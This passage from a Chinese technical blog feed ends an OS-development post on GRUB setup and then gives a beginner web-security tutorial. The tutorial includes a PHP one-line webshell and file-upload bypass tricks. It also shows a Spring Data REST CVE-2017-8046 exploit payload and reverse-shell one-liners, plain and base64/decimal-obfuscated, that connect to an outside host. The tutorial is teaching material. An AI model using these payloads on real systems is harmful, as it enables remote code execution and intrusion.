id="fnref13">[13]</a></sup>并添加一块新硬盘</p></li><li><p>创建 ext4 文件系统并挂载硬盘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mkfs.ext4 /dev/sdb <span class="token comment"># /dev/sdb表示第二块硬盘</span><span class="token function">sudo</span> <span class="token function">mount</span> /dev/sdb hdisk <span class="token comment"># 挂载</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>安装 GRUB，在 boot 目录下多了一个 grub 目录表示安装成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grub-install --boot-directory<span class="token operator">=</span>./hdisk/boot/ --force --allow-floppy /dev/sdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 <code>/hdisk/boot/grub/</code> 目录下建立一个 <code>grub.cfg</code> 文本文件让 GRUB 可以查找到操作系统映像文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">menuentry <span class="token string">'Hellos'</span> <span class="token punctuation">{</span>insmod part_msdosinsmod ext2<span class="token builtin class-name">set</span> <span class="token assign-left variable">root</span><span class="token operator">=</span><span class="token string">'hd0'</span>multiboot2 /boot/Hellos.eki <span class="token comment">#加载boot目录下的HelloOS.eki文件</span>boot <span class="token comment">#引导启动</span><span class="token punctuation">}</span><span class="token builtin class-name">set</span> <span class="token assign-left variable">timeout_style</span><span class="token operator">=</span>menu<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">${timeout}</span>"</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">set</span> <span class="token assign-left variable">timeout</span><span class="token operator">=</span><span class="token number">10</span> <span class="token comment">#等待10秒钟自动启动</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>拷贝 Hellos.eki到 hdisk/boot 目录</p></li><li><p>创建新的虚拟机，选择类型其他Linux，添加创建好的硬盘</p></li></ul><h3 id="建造二级引导器">建造二级引导器</h3><ul><li><p>二级引导器作为操作系统的先驱，不执行具体的加载任务，而是解析内核文件、收集机器环境信息，确定这个计算机能不能运行操作系统，并对CPU、内存、显卡进行一些初级的配置</p></li><li><p>处理操作系统运行环境的工作独立出来交给二级引导器，可以降低开发操作系统的难度，也能增加操作系统的通用性，针对不同的硬件平台，只需要开发不同的二级引导器</p></li><li><p>二级引导器</p><ul><li>检查CPU是否支持64位的工作模式</li><li>收集内存布局信息</li><li>设置MMU页表</li><li>设置显卡模式</li><li>释放中文字体文件</li></ul></li><li><p>C语言环境下调用BIOS中断</p><ul><li>保存C语言环境下的CPU上下文 ，即保护模式下的所有通用寄存器、段寄存器、程序指针寄存器，栈寄存器，将其保存在内存中</li><li>切换回实模式，调用BIOS中断，把BIOS中断返回的相关结果，保存在内存中</li><li>切换回保护模式，重新加载之前保存的寄存器，重新恢复执行C语言代码</li></ul></li></ul><blockquote><p>未完待续 …</p></blockquote><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://www.itzhai.com/assembly-int-10h-description.html">汇编10H中断详细说明</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>实模式下内存布局<br><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-memory-distribution.png" style="zoom: 50%;"> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://blog.csdn.net/better0332/article/details/3416749">DPL/RPL/CPL 之间的联系和区别</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://www.cnblogs.com/flashsun/p/12258829.html">深入浅出特权级 </a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>保护模式4KB页CR3、页目录项、页表项的格式<br><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220710-4k-page-format.jpg" style="zoom:50%;"> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>长模式4KB页的CR3、顶级页目录项、页目录指针项、页目录项、页表项的格式<br><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220711-long-mode-4k-page-format.jpg" style="zoom:50%;"> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p>2MB分页模式下的CR3、顶级页目录项、页目录指针项、页目录项的格式<br><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220711-long-mode-2m-page-format.jpg" style="zoom:50%;"> <a href="#fnref7" class="footnote-backref">↩︎</a></p></li><li id="fn8" class="footnote-item"><p><a href="https://blog.csdn.net/zhanyd/article/details/102631248">什么是缓存的局部性原理？</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p></li><li id="fn9" class="footnote-item"><p>更先进的 <a href="https://uefi.org/">UEFI BIOS</a> 则不同 <a href="#fnref9" class="footnote-backref">↩︎</a></p></li><li id="fn10" class="footnote-item"><p><a href="https://437436999.github.io/2020/03/15/%E6%98%BE%E5%8D%A1%E6%96%87%E6%9C%AC%E6%A8%A1%E5%BC%8F/">显卡文本模式</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p></li><li id="fn11" class="footnote-item"><p><a href="https://www.zhihu.com/question/335397213/answer/752283935">机械硬盘如何编址</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p></li><li id="fn12" class="footnote-item"><p><a href="http://nodekey.com/mbr-e5-88-b0loader-e7-9a-84-e8-bf-87-e6-b8-a1--e5-9c-a8-e6-b1-87-e7-bc-96-e5-b1-82-e9-9d-a2-e8-af-bb-e5-8f-96-e7-a1-ac-e7-9b-98-e6-95-b0-e6-8d-ae/">在汇编层面读取硬盘数据</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p></li><li id="fn13" class="footnote-item"><p>如果虚拟机使用VMware，可以使用StarwindConverter进行虚拟机磁盘镜像互转 <a href="#fnref13" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全基础</title>
      <link href="2021/01/27/web-sec-basic/"/>
      <url>2021/01/27/web-sec-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Web安全基础">Web安全基础</h2><h3 id="1-前端基础">1. 前端基础</h3><h4 id="1-1-前端开发">1.1 前端开发</h4><p>前端开发是创建Web页面或App等前端界面呈现给用户的过程</p><p>网页制作是Web1.0时代的产物，早期网站主要内容都是静态，以图片和文字为主，用户使用网站的行为也以浏览为主，随着互联网技术的发展和HTML5、CSS3的应用，现代网页更加美观，交互效果显著，功能更加强大</p><blockquote><p>**为什么前后端分离？**性能问题 &amp; 学习成本</p></blockquote><blockquote><p><strong>前后端的走向？</strong></p><p>前端：页面表现，速度流畅，兼容性，用户体验等等</p><p>后端：三高（高并发，高可用，高性能），安全，存储，业务等等</p></blockquote><h4 id="1-2-HTML入门">1.2 HTML入门</h4><h5 id="HTML介绍">HTML介绍</h5><p>HTML（ <code>HyperText Markup Language</code>）即超文本标记语言，是用来构建网页的一种语言</p><ul><li><p>HTML是一整套标记标签构成的标记语言，而非编程语言</p></li><li><p>HTML用于承载网页的内容（文本、图片、语音、视频）</p></li><li><p>通俗的讲：使用HTML标记标签与纯文本按规则构建的文档，通常也称为网页</p></li><li><p>浏览器对HTML文档解析，根据标签的顺序，按指定标签对应的规则显示纯文本内容</p></li></ul><h5 id="HTML网页结构">HTML网页结构</h5><p>一个标准的HTML页面由以下三个部分组成</p><ul><li><p>HTML版本声明：不是 HTML 标签，而是指示浏览器关于页面使用哪个 HTML 版本进行编写的指令</p></li><li><p>HTML头部：涉及页面标题、字符集、样式、链接等内容</p></li><li><p>HTML主体：浏览器展现给用户的内容，包括标题、文本、段落、链接、图片、媒体等，所有的页面内容都由HTML主体部分标签来实现</p></li></ul><h5 id="HTML标签-元素-属性">HTML标签/元素/属性</h5><h4 id="1-3-CSS入门">1.3 CSS入门</h4><p>层叠样式表（<code>Cascading Style Sheets</code>）是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言</p><ul><li>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力</li></ul><h4 id="1-4-JavaScript-入门">1.4 JavaScript 入门</h4><p>JavaScript，是可插入 HTML 页面，可以由绝大多数现代浏览器执行的轻量级的编程语言。</p><ul><li><p>是基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格</p></li><li><p>Node.js：简单的说 Node.js 就是运行在服务端的 JavaScript</p><ul><li><p>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</p></li><li><p>Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎</p></li></ul></li></ul><h5 id="JavaScript-功能">JavaScript 功能</h5><ul><li>做出反应</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>first<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Welcome，hello world!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>做出反应<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>改变HTML内容</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>second<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>changeContent();<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>改变HTML内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>change<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>开始了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">changeContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"change"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查找元素 </span>x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"开始很久了，已经结束了"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>改变HTML样式</li><li>验证输入</li></ul><h3 id="2-Web-App简介">2. Web App简介</h3><p>Web App（或Web应用程序）运行于网络和标准浏览器上，基于网页技术开发实现特定功能的应用</p><ul><li><p>前端：HTML，CSS，JavaScript</p></li><li><p>后端：Java，Python，PHP</p></li><li><p>数据库：MySQL，Oracle，MongoDB</p></li><li><p>容器：Windows(IIS)，Linux(Nginx, Apache)</p></li></ul><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210823-100700848.png" alt="web服务组件"></p><h5 id="从输入网址到看到网页过程">从输入网址到看到网页过程</h5><ul><li><p>客户输入URL，DNS解析URL得出IP地址，根据IP地址找出对应服务器</p></li><li><p>客户机通过TCP/IP协议建立到Web服务器的TCP链接</p></li><li><p>客户机向Web服务器发送HTTP请求报文，请求服务器里资源的资源文档</p></li><li><p>Web服务器接收到客户机的HTTP请求报文，然后向客户机发出HTTP响应报文</p><ul><li>请求的种类不同（HTML文档、PHP文件、访问数据库），服务器的行为不一样</li></ul></li><li><p>客户机解析HTML静态文档</p></li><li><p>客户机与服务器断开链接</p></li></ul><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-web-process.png" style="zoom:80%;"><h5 id="Python实现简单服务器">Python实现简单服务器</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">:</span>    buf <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token string">"HTTP/1.1 200 OK\r\n\r\n"</span>    msg1 <span class="token operator">=</span> <span class="token string">"Hello World!"</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> msg<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> msg1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        handleRequest<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="框架">框架</h5><p>Web应用框架（Web application framework）是一种开发框架，用来支持动态网站、网络应用程序及网络服务的开发</p><ul><li><p>类型有基于请求的和基于组件的</p></li><li><p>有助于减轻网页开发时共通性活动的工作负荷，例如许多框架提供数据库访问接口、标准样板以及会话管理等</p></li><li><p>可提升代码的可再用性</p></li></ul><h3 id="3-Web安全总览">3. Web安全总览</h3><h4 id="3-1-协议基础">3.1 协议基础</h4><h5 id="HTTP协议">HTTP协议</h5><p>HTTP协议定义了Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端</p><p><a href="https://night-candle.github.io/2021/02/04/cs-network-protocol/#toc-heading-5">HTTP/1.1</a></p><h4 id="3-2-安全溯源">3.2 安全溯源</h4><p>Web应用全部都是建立在HTTP协议基础上，是对HTTP协议的实际应用</p><p>Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-safety-traceability.png" alt=""></p><blockquote><p><strong>Web安全根本在于Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击</strong></p></blockquote><h4 id="3-3-安全问题">3.3 安全问题</h4><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210821-sec-problem.png" style="zoom:80%;"><h2 id="后端安全">后端安全</h2><h3 id="1-文件上传漏洞">1. 文件上传漏洞</h3><p>文件上传（<code>File Upload</code>）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等</p><p>文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等</p><h4 id="1-1-编辑木马并上传">1.1 编辑木马并上传</h4><blockquote><p>关键函数</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-eval.png" alt=""></p></blockquote><p>一句话木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-115203947.png" alt="测试"></p><h4 id="1-2-绕过方法">1.2 绕过方法</h4><h5 id="1-2-1-服务器关联型漏洞">1.2.1 服务器关联型漏洞</h5><p><strong>IIS 5.x / 6.0 解析漏洞</strong></p><p>当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件</p><p>漏洞利用：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a> 会被解析成asp文件</p><p>服务器默认不解析“;”以后的内容</p><p>漏洞利用：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a> 会被解析成为asp文件</p><p><strong>Nginx 解析漏洞</strong></p><p>低版本Nginx存在一个由PHP-CGI导致的文件解析漏洞：php.ini配置文件中cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析</p><p>漏洞利用：<a href="http://xn--www-7n0jp43b.xx.com/phpinfo.jpg/1.php">访问www.xx.com/phpinfo.jpg/1.php</a> （1.php不存在，会按照php格式解析phpinfo.jpg文件）</p><p><strong>Apache 解析漏洞</strong></p><p>Apache 在1.x和2.x版本中存在解析漏洞：Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析</p><p>漏洞利用：上传并访问shell.php.test；服务器会解析shell.php.test文件，但是按照php文件格式进行解析</p><h5 id="1-2-2-前端限制绕过">1.2.2 前端限制绕过</h5><p>只在前端利用 JavaScript 来做校验</p><p>漏洞利用：</p><ol><li><p>通过Burp Suite抓包，然后修改内容后放行</p></li><li><p>通过Chrome禁止/删除JavaScript代码</p></li></ol><h5 id="1-2-4-黑名单绕过">1.2.4 黑名单绕过</h5><ul><li><p>content-type绕过</p></li><li><p>大小写绕过</p><ul><li><p>Win平台大小写不敏感</p></li><li><p>Linux平台造成此现象主要原因是缺少speling模块，要在相应的系统里加载</p></li></ul></li><li><p>双写绕过</p></li><li><p>生僻扩展名绕过</p><ul><li><p>修改后缀为 .php3 .php4 .php5 等</p></li><li><p>原理：配置文件/etc/apache2/mods-enabled/php5.conf</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-124322.png" alt=""></p></li></ul></li><li><p>扩展名加空格绕过</p></li><li><p>Windows 文件流特性绕过</p><ul><li>NTFS文件系统实现了<strong>多文件流特性</strong>，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序</li><li>扩展名加点号绕过(Win)</li><li>扩展名加::$DATA绕过(Win)</li></ul></li><li><p>.htaccess绕过</p><ul><li><p><strong>.htaccess文件</strong>（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件，启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤</p></li><li><p>漏洞利用：上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】，上传一句话木马文件，文件名设置为shell.test</p></li></ul></li><li><p>文件头检测绕过</p><ul><li>拼接png与php文件</li></ul></li></ul><h5 id="1-2-5-00截断绕过">1.2.5 %00截断绕过</h5><p>原理：保存文件的时候是路径拼接的形式，而路径又是从前端获取，所以可以采用在路径上截断</p><h5 id="1-2-6-漏洞链">1.2.6 漏洞链</h5><p>基于我们已经成功上传一句话木马内容的jpg，联合使用本地/远程文件包含漏洞，既可以完成渗透</p><blockquote><p><strong>Fuzz</strong></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210822-fuzz.png" alt=""></p><p>模糊测试（fuzz testing）和渗透测试（penetration test）都是属于安全测试的方法，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用；而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议</p><p><strong>注意事项</strong>：</p><ol><li><p>Fuzz过程由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃，因此多用于非生产环境</p></li><li><p>Fuzz过程会产生大量负载，可能会对生产环境造成影响</p></li><li><p>安全监测过程中很容易由于过多访问触发安全警报，进而为后续安全检测制造障碍</p></li></ol></blockquote><h4 id="1-3-防御方法">1.3 防御方法</h4><ul><li><p>文件类型检测：白名单优于黑名单</p></li><li><p>使用安全的函数进行编程</p></li><li><p>熟悉业务部署环境的OS、Web Server配置</p></li></ul><h3 id="2-SQL注入">2. SQL注入</h3><p>SQL注入漏洞是发生于应用程序与数据库层的安全漏洞。</p><p>网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险</p><h4 id="2-1-MySQL基础">2.1 MySQL基础</h4><p>1、学习函数</p><p>​    掌握以下函数的用法，并在命令行进行实践操作：concat()、group_concat()、concat_ws()、load_file()、hex()、char()、count()、substring()、into+outfile、LOAD DATA INFIL、limit</p><h4 id="GET-注入">GET 注入</h4><h4 id="POST-注入">POST 注入</h4><h4 id="OOB注入">OOB注入</h4><h4 id="WAF绕过">WAF绕过</h4><h4 id="SQLMap">SQLMap</h4><h3 id="3-框架安全">3. 框架安全</h3><p>随着应用开发的复杂度提升，很难再有完全从零开发的web应用，而更多的使用web框架，很大一部分开源框架得到了全世界的开发者支持，具备更加强大功能和完善的支持</p><p>开源框架的问题在于源码被全世界的开发者所阅读，一旦一个大型框架出现漏洞，那么黑客相当于拿到了所有使用这个框架的网站的通行证，几乎所有的大型框架都出现过漏洞，影响范围非常广</p><blockquote><p><strong>CVE- Common Vulnerabilities &amp; Exposures</strong>：广泛认同的信息安全漏洞或者已经暴露出来的弱点给出的一个公共名称</p><p>认定的一般流程：</p><p>发现—&gt;公开—&gt;编号—&gt;提案—&gt;修改—&gt;中间决策—&gt;最终决策—&gt;正式发布—&gt;（再评估）—&gt;（撤销）</p></blockquote><h4 id="spring-data-rest-（CVE-2017-8046）">spring-data-rest （CVE-2017-8046）</h4><p>Spring Data Rest设计的目的是消除curd的模板代码，减少程序员的刻板的重复劳动，增删改查动作分别对应四种请求类型：post、delete、update/patch、get</p><p><code>PATCH</code> 方法是 HTTP 协议新引入的，是对 PUT 方法的补充，使用 JSON 格式数据来对已知资源进行局部更新</p><ul><li><p>Spring 3.2 开始支持 PATCH 方法，但要选对部署的容器</p></li><li><p>由 RFC6902 所约束，需包含 path 和 op 字段</p></li><li><p>具有自己的 MIME 类型：application/json-patch+json</p></li><li><p>op 代表操作，必须存在，只能由6种明确表示操作的词汇组成，每一个操作结果作为下一个操作的对象，如果发生错误即返回错误信息，则全部变更不生效，成功返回204</p></li></ul><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-132934071.png" style="zoom: 50%;"><p><strong>漏洞示例：</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">curl -i -X POST -H "Content-Type: application/json-patch+json" -d "{""first name"":""si"",""lastname"":""Li""}" http://192.168.56.102:81/customers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-131431118.png" alt=""></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-134949328.png" alt="漏洞利用"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token property">"op"</span><span class="token operator">:</span> <span class="token string">"replace"</span><span class="token punctuation">,</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastName"</span><span class="token punctuation">,</span> <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"test"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-135948546.png" alt=""></p><blockquote><p><strong>反弹shell</strong></p><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p><strong>base64编码</strong></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p><strong>进制转换</strong></p><p>98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,65,117,77,84,65,122,76,122,99,51,78,122,99,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125</p></blockquote><p><strong>漏洞分析</strong></p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-vulnerability-analysis.png" alt=""></p><p><strong>漏洞修复</strong></p><p>在 1.5.7 版本中就对漏洞进行了修复，PatchOperation 类的 evaluateValueFromTarget 方法里面加入了verifyPath, 对路径的有效性做了验证，主要过滤了数字</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210825-141237193.png" alt=""></p><h4 id="防御措施">防御措施</h4><ul><li><p>关注官方网站，及时追踪更新</p></li><li><p>关注漏洞披露网站</p><p>CVE <a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><p>Exploit Database <a href="https://www.exploit-db.com">https://www.exploit-db.com</a></p><p>ZERODIUM <a href="https://zerodium.com/">https://zerodium.com/</a></p></li></ul><h2 id="前端安全">前端安全</h2><h3 id="1-跨站脚本攻击（XSS）">1. 跨站脚本攻击（XSS）</h3><p>OWASP Top10 2017 第七，浏览器将用户输入的内容，当做脚本执行，执行了恶意的功能，这种针对用户浏览器的攻击即跨站脚本攻击</p><p><strong>XSS 危害</strong><br>（JavaScript 能够写出的任意恶意功能）</p><ul><li>盗取 Cookie</li><li>盗取账户</li><li>恶意软件下载</li><li>键盘记录</li><li>广告引流</li></ul><h4 id="1-1-反射型">1.1 反射型</h4><p>应用程序或 API 包括未经验证和未经转义的用户输入， 直接作为 HTML 输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript</p><p>特点：非持久化，必须用户点击带有特定参数的链接才能引起</p><p>影响范围：仅执行脚本的用户</p><h4 id="1-2-存储型">1.2 存储型</h4><h4 id="1-3-DOM-型">1.3 DOM 型</h4><h3 id="2-CSRF">2. CSRF</h3><h3 id="3-RCE">3. RCE</h3><h2 id="容器安全">容器安全</h2><h3 id="Apache">Apache</h3><h3 id="Nginx">Nginx</h3><h3 id="Tomcat">Tomcat</h3><h2 id="互联网企业安全运营">互联网企业安全运营</h2><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/20210202-223222691.png" alt="image-20210202223222691" style="zoom: 70%;"><h3 id="DDos">DDos</h3><h3 id="访问控制">访问控制</h3>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 前端 </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
